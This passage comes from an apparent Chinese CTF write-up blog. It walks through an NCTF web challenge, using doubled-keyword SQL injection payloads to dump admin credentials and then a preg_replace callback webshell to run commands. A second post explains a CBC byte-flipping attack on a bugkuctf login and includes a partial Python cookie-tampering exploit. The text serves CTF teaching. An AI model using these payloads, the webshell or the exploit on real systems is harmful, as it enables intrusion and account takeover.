class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;æç´¢çè¨&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div id=<span class="string">"say"</span> name=<span class="string">"say"</span> align=<span class="string">"left"</span> style=<span class="string">"width:1024px"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'ä¸æ¶æ»´é»éï¼æ¬åè½åªæç¨æ¬å¬å¸å¼åçæµè§å¨æå¯ä»¥ç¨å~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"ä¸è½è¿æ¥å°æ°æ®åºï¼ï¼"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们看到这里的参数id虽然被mysql_real_escape_string函数处理过，但是在sql语句中是参数id是没有被引号包裹的，但是id经过自定义函数antiinject处理，这个函数在so.php未被定义，猜测可能定义在包含的文件antiinject.php中，我们再读取它的源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</span><br><span class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个过滤函数，通过str_replace函数过滤一些关键字，但是str_replace函数只需要双写就可以绕过，但是这里还过滤了空格，mysql中注释符/**/可以代替空格</p><p>这里还需注意将请求头的User-Agent字段修改为Xlcteam Browser</p><p>那么我们就可以愉快的注入了，首先POST参数soid=1，发现有查询结果，那么就可以注出查询返回列数</p><p>soid=1/<strong>/oorrdoorrderer/</strong>/by/**/4有查询结果</p><p>soid=1/<strong>/oorrdoorrderer/</strong>/by/**/5无查询结果，返回列数为4</p><p>soid=0时无查询结果，用union注入</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/**/1,2,3,4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/47.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>返回的列在2,3位置</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/**/1,database(),3,4爆库</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/48.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>库名为sae-exploitblog</p><p>根据之前说明文本的提示表admin的结构</p><p>soid=0/<strong>/uunionnion/</strong>/sselectelect/<strong>/1,(sselectelect/</strong>/usernnameame/<strong>/ffromrom/</strong>/aadmindmin),(sselectelect/<strong>/userppassass/</strong>/ffromrom/**/aadmindmin),4</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/49.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注出用户名admin和密码102 117 99 107 114 117 110 116 117</p><p>这里密码还经过函数antixss处理过，保险起见还是再读取一下antixss.php的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function antixss($content)&#123;</span><br><span class="line">preg_match(&quot;/(.*)\[a\](.*)\[\/a\](.*)/&quot;,$content,$url);</span><br><span class="line">$key=array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;\\&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;&apos;&quot;,&quot;%28&quot;,&quot;%29&quot;,&quot; on&quot;,&quot;data&quot;,&quot;src&quot;,&quot;eval&quot;,&quot;unescape&quot;,&quot;innerHTML&quot;,&quot;document&quot;,&quot;appendChild&quot;,&quot;createElement&quot;,&quot;write&quot;,&quot;String&quot;,&quot;setTimeout&quot;,&quot;cookie&quot;);//å ä¸ºå¤ªèï¼å¾æï¼æä»¥ããã(è¿æ»¤è§åæ¥èªMramydnei)</span><br><span class="line">$re=$url[2];</span><br><span class="line">if(count($url)==0)&#123;</span><br><span class="line">return htmlspecialchars($content);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">for($i=0;$i&lt;=count($key);$i++)&#123;</span><br><span class="line">$re=str_replace($key[$i], &apos;_&apos;,$re);</span><br><span class="line">&#125;</span><br><span class="line">return htmlspecialchars($url[1],ENT_QUOTES).&apos;&lt;a href=&quot;&apos;.$re.&apos;&quot;&gt;&apos;.$re.&apos;&lt;/a&gt;&apos;.htmlspecialchars($url[3],ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>大概是过滤一些html标签关键字，我们注出的密码应该只是经过 htmlspecialchars函数处理，没有什么影响</p><p>那么得到用户名和密码，大概是要进入一个登陆界面</p><p>这时注意到about.php文件中过滤了关键字loginxlcteam</p><p>就试着访问<a href="http://cms.nuptzj.cn/loginxlcteam" target="_blank" rel="noopener">http://cms.nuptzj.cn/loginxlcteam</a></p><p>没想到就访问到了登陆界面</p><p>我们试着将注出的用户名和密码输入，提示错误</p><p>此时回去看看说明的文本，里面提示了密码加密文件passencode.php </p><p>猜测可能密码有经过加密，我们先读取passencode.php 源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function passencode($content)&#123;</span><br><span class="line">//$pass=urlencode($content);</span><br><span class="line">$array=str_split($content);</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;count($array);$i++)&#123;</span><br><span class="line">if($pass!=&quot;&quot;)&#123;</span><br><span class="line">$pass=$pass.&quot; &quot;.(string)ord($array[$i]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$pass=(string)ord($array[$i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $pass;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看了加密的源代码，很明显我们注出的密码102 117 99 107 114 117 110 116 117是经过加密的，我们根据加密的过程写出解密的过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function passdecode($pass)&#123;</span><br><span class="line">$arr = explode(&quot; &quot;,$pass);</span><br><span class="line">$content = &quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;count($arr);$i++)&#123;</span><br><span class="line">$content = $content.chr($arr[$i]);</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pass = &quot;102 117 99 107 114 117 110 116 117&quot;;</span><br><span class="line">$content = passdecode($pass);</span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>执行结果：fuckruntu</p><p>再次在登录界面输入用户名admin,密码fuckruntu</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/50.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提示我们还差最后一步，并且提示将一句话木马放在网站根目录下的xlcteam.php文件中</p><p>既然在根目录下，我们还是可以在about.php中读取源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查询得到这是一个回调函数的一句话木马</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/51.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们post参数www=preg_replace,wtf就是我们可以任意执行的命令</p><p>那么我们可以post参数wtf=print_r(scandir(‘./‘));</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/nctf/52.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现文件：恭喜你获得flag2.txt </p><p><img src="/img/nctf/53.png" alt=""></p><p>获得flag</p>]]></content>
    
    <summary type="html">
    
      nctf-Web
    
    </summary>
    
      <category term="nctf-Web" scheme="https://Foxgrin.github.io/categories/nctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="https://Foxgrin.github.io//posts/47995/"/>
    <id>https://Foxgrin.github.io//posts/47995/</id>
    <published>2018-08-11T03:12:00.000Z</published>
    <updated>2018-08-11T05:43:28.692Z</updated>
    
    <content type="html"><![CDATA[<p>几个月之前就碰到了这类题，但是一直没搞懂，最近做ctf又碰到了，赶紧研究了一番，总算是搞懂了<a id="more"></a></p><h3 id="CBC原理"><a href="#CBC原理" class="headerlink" title="CBC原理"></a>CBC原理</h3><p>首先还是要稍微了解一下CBC加密和解密的原理</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>如果用公式来表示的话，如下：（C表示密文，E表示进行加密，P表示明文，D表示进行解密，IV表示初始向量） </p><p><img src="/img/CBC字节翻转攻击/2.png" alt=""></p><p>再来看看如何进行攻击：（下面图片摘自《图解密码技术》一书） </p><p><img src="/img/CBC字节翻转攻击/3.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上面就是CBC原理，其实看上去一脸懵逼很正常，但是其实我们只需要关注CBC解密的过程，因为我们攻击的过程就是解密的过程，为什么呢，我们来看实例的代码分析就知道了</p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>实例来自bugkuctf web类最后一题login4</p><p>网址：<a href="http://118.89.219.210:49168/" target="_blank" rel="noopener">http://118.89.219.210:49168/</a></p><p>扫描目录发现存在文件.index.php.swp，下载下来后用linux 的vim -r 命令恢复文件后可以查看到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">function get_random_iv()&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show_homepage()&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line">    if($username === &apos;admin&apos;)&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先服务器接收我们POST的参数username和password，并对username进行检查，如果是admin，则退出程序，如果不是admin，则创建一个数组info，来存放我们输入的username和password，然后经过login函数，也就是cbc的加密，加密的过程是首先创建一个16位长度的随机字符串，然后与数组info序列化后的字符串plain进行CBC加密，也就是一系列的异或运算，具体的加密我们可以不用管，因为我们改变不了加密的过程，我们要操作的，是接下来的解密过程。再往下看程序，加密完以后，会将加密过程的初始化向量(也就是16位的随机字符串)iv和加密后的密文cipher经过base64加密后分别存放到cookie中，这样加密过程就算完成了。接下来，我们再次登录时，服务器执行check_login函数，将cookie中的iv和cipher字段值取出来进行base64解密后，进行cbc的解密，再将解密后字符串进行反序列化得到数组info，然后将info的username取出放入session的username字段，最后检查username如果是admin，则可以查看到flag，如果不是，则输出只有admin才可以查看flag，总的来说，这算是前后矛盾，一开始如果我们输入的username是admin，则提示admin查看不了flag，我们输入的如果不是admin，又提示admin才可以查看flag</p><p>所以，要拿到flag，我们的思路，就是一开始输入Admin，然后操作CBC解密的过程，让它最后解密出来的值变成admin，就可以拿到flag，为此，我们重点就是放在cbc解密的过程，来看一张比较清楚的思路图</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>分析解密的过程：</p><p>(1)首先以16位为长度对密文进行分组</p><p>(2)初始化向量iv与前16位的解密的密文分组1进行位异或运算得到明文分组1</p><p>(3)密文分组1与解密的密文分组2进行异或运算得到明文分组2</p><p>(4)密文分组2与解密的密文分组3进行异或运算得到明文分组3</p><p>(5)以此类推</p><p>那我们就按照解密的过程的顺序逐步演示攻击的过程</p><p>首先我们对明文进行分组，因为我们加密的过程也是位异或，所以最终得到的密文位数是等于明文位数的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;<span class="string">'Admin'</span>,<span class="string">'password'</span>=&gt;<span class="string">'admin'</span>);</span><br><span class="line">$plain = serialize($info);</span><br><span class="line"><span class="keyword">echo</span> $plain.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($plain); $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($plain[$i] == <span class="string">'A'</span>)&#123;</span><br><span class="line">$A_index = $i % <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($i % <span class="number">16</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>.$plain[$i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $plain[$i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;'</span>.<span class="string">'the index of A is: '</span>.$A_index;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里我们定下一开始输入的username是Admin,password是admin,对info数组进行序列化处理然后分组</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>我们翻转的位置是A，我们要想办法将它翻转成a，从而将用户名变成admin，上面已经分析过了解密是位异或，A所处于的密文分组是分组2，它是与密文分组1进行位异或运算得到明文分组2的</p><p>所以我们要操纵的就是密文分组1的第9位，使它与A所处的密文分组2异或后得到a</p><p>但是我们还要考虑，我们改变了密文分组的第9位，只会影响下一组明文翻转的那一位，但却会影响本组明文的全部，因为我们翻转过的密文要先经过解密，然后才和IV变量进行异或，解密的时候是整串数据进行，所以整串明文受其影响。甚至可能会导致生成的明文部分乱码，至少绝对不再是原来的明文了。 所以，我们还需要操作iv，也就是初始化向量，使它与解密的密文分组1异或能得到原来的明文分组1，也就是a:2:{s:8:”userna</p><p>最后就需要考虑如何得到我们想要的字符，直接看公式吧</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">本组明文 = Decrypt(本组密文) ^ 上一组密文</span><br><span class="line">A              B                 C</span><br><span class="line">=========================================================</span><br><span class="line">A = B ^ C</span><br><span class="line">A ^ A = 0;   0 ^ A = A</span><br><span class="line">C = A ^ A ^ C = B ^ C ^ A ^ C = A ^ B</span><br><span class="line">(即C = A ^ B ，即：上一组密文 = 本组明文 ^ Decrypt(本组密文) )</span><br><span class="line">ascii(&apos;a&apos;) ^ C ^ A ^ B = ascii(&apos;a&apos;) ^ A ^ B ^ A ^ B = ascii(&apos;a&apos;) ^ 0 = ascii(&apos;a&apos;)</span><br><span class="line">(假设我们想要翻转成a，使用如上公式即可,即：想要的字符 = 上一组密文 ^ 本组明文 ^ Decrypt(本组密文) ^ 想要的字符 )</span><br></pre></td></tr></table></figure><p>那么接下来，我们就可以开始编写脚本了，首先，我们先将用户名：Admin和密码：admin POST给服务器</p><p>然后获取cookie值的cipher字段，操作第一个密文分组的第九位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49168/"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'Admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">cipher = cookies[<span class="string">'cipher'</span>]</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">index = <span class="number">9</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'a'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span 